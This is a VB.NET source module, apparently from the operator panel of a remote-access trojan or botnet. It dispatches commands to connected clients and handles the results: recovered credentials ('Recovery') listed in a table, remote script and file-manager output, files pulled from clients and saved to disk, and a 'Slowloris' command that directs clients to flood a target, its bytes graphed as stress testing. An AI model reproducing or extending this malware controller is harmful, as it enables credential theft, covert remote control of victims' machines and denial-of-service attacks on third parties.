Option Strict Off
Imports Microsoft.VisualBasic
Imports System.Windows.Forms


Module MiscCommandHandler

    Dim BytesSent As Integer = 0

#Region " Handlers "

    Public Sub HandleMiscCommand(params As Object())
        Select Case DirectCast(params(1), MiscCommand)
            Case MiscCommand.Recover
                HandleMiscCommandRecovery((params))
            Case MiscCommand.Script
                HandleMiscCommandScript((params))
            Case MiscCommand.Manage
                HandleMiscCommandManage((params))
            Case MiscCommand.Upload
                HandleMiscCommandUpload((params))
            Case MiscCommand.SST
                HandleMiscCommandSST((params))
        End Select
    End Sub

#End Region

#Region " Senders "

    Public Sub SendMiscCommandMessage(Client As IClient, Message As String)
        SendCommand(Client, CommandType.MiscCommand, MiscCommand.Message, Message)
    End Sub

    Public Sub SendMiscCommandRecover(Client As IClient, Message As String)
        SendCommand(Client, CommandType.MiscCommand, MiscCommand.Recover, Message)
    End Sub

    Public Sub SendMiscCommandManage(Client As IClient, Message As String)
        SendCommand(Client, CommandType.MiscCommand, MiscCommand.Manage, Message)
    End Sub

    Public Sub SendMiscCommandScript(Client As IClient, Message As String)
        SendCommand(Client, CommandType.MiscCommand, MiscCommand.Script, Message)
    End Sub

    Public Sub SendMiscCommandUpload(Client As IClient, Message As String)
        SendCommand(Client, CommandType.MiscCommand, MiscCommand.Upload, Message)
    End Sub

    Public Sub SendSSTSlowloris(Client As IClient, Message As String)
        SendCommand(Client, CommandType.comSST, SSTType.Slowloris, Message)
    End Sub
#End Region


    Private Sub HandleMiscCommandRecovery(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        Dim SplitCommand() As String = Split(Message, "|")
        Try
            Try
                Dim li As New ListViewItem
                li = RecMul.Recovery1.ListView1.Items.Add(SplitCommand(0))
                li.SubItems.Add(SplitCommand(4))
                li.SubItems.Add(SplitCommand(5))
                li.SubItems.Add(SplitCommand(1))
                li.SubItems.Add(SplitCommand(2))
                li.SubItems.Add(SplitCommand(3))
            Catch ex As Exception
                MsgBox(ex.Message)
                Logging.LogServerException(ex, "MultiCore - Recovery")
            End Try

        Catch ex As Exception
            Logging.LogServerException(ex, "MultiCore - Recovery")
        End Try
    End Sub
    Private Sub HandleMiscCommandScript(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        Dim SplitCommand() As String = Split(Message, "|")
        Try
            Try

                Dim lis As New ListViewItem
                lis = RemTAB.ListView1.Items.Add(SplitCommand(0))
                lis.SubItems.Add(SplitCommand(1))
                lis.SubItems.Add(SplitCommand(2))
                lis.SubItems.Add(SplitCommand(3))
                lis.SubItems.Add(SplitCommand(4))

            Catch ex As Exception
                Logging.LogServerException(ex, "MultiCore - Remote")
            End Try

        Catch ex As Exception
            Logging.LogServerException(ex, "MultiCore - Remote")
        End Try
    End Sub
    Private Sub HandleMiscCommandManage(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        Dim SplitCommand() As String = Split(Message, "|")
        Try

            Dim lis As New ListViewItem
            lis = FileMan.ListView1.Items.Add(SplitCommand(0))
            lis.SubItems.Add(SplitCommand(1))
            lis.SubItems.Add(SplitCommand(2))
            lis.SubItems.Add(SplitCommand(3))

        Catch ex As Exception
            Logging.LogServerException(ex, "MultiCore - Manager")
        End Try
    End Sub
    Private Sub HandleMiscCommandUpload(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        Dim SplitCommand() As String = Split(Message, "|")
        If Not My.Computer.FileSystem.DirectoryExists(CurDir() & "\Downloads\") Then
            My.Computer.FileSystem.CreateDirectory(CurDir() & "\Downloads")
        End If
        Try
            My.Computer.FileSystem.WriteAllBytes(CurDir() & "\Downloads\" & SplitCommand(1), Base64Decode(SplitCommand(0)), False)
            MessageBox.Show("File has successfully been downloaded!" & vbNewLine & _
                            "\Downloads\" & SplitCommand(1), "File download", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception
            MessageBox.Show("File has failed to download!", "File download", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
    Private Sub HandleMiscCommandSST(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        SSTMutli.StressTesting1.Graph1.AddValue(Message)
        BytesSent += Message
        SSTMutli.OverallStress1.Graph1.AddValue(BytesSent)
    End Sub

    Public Function Base64Decode(ByVal Input As String)
        Dim decodedBytes As Byte() = Convert.FromBase64String(Input)
        Return decodedBytes
    End Function

End Module
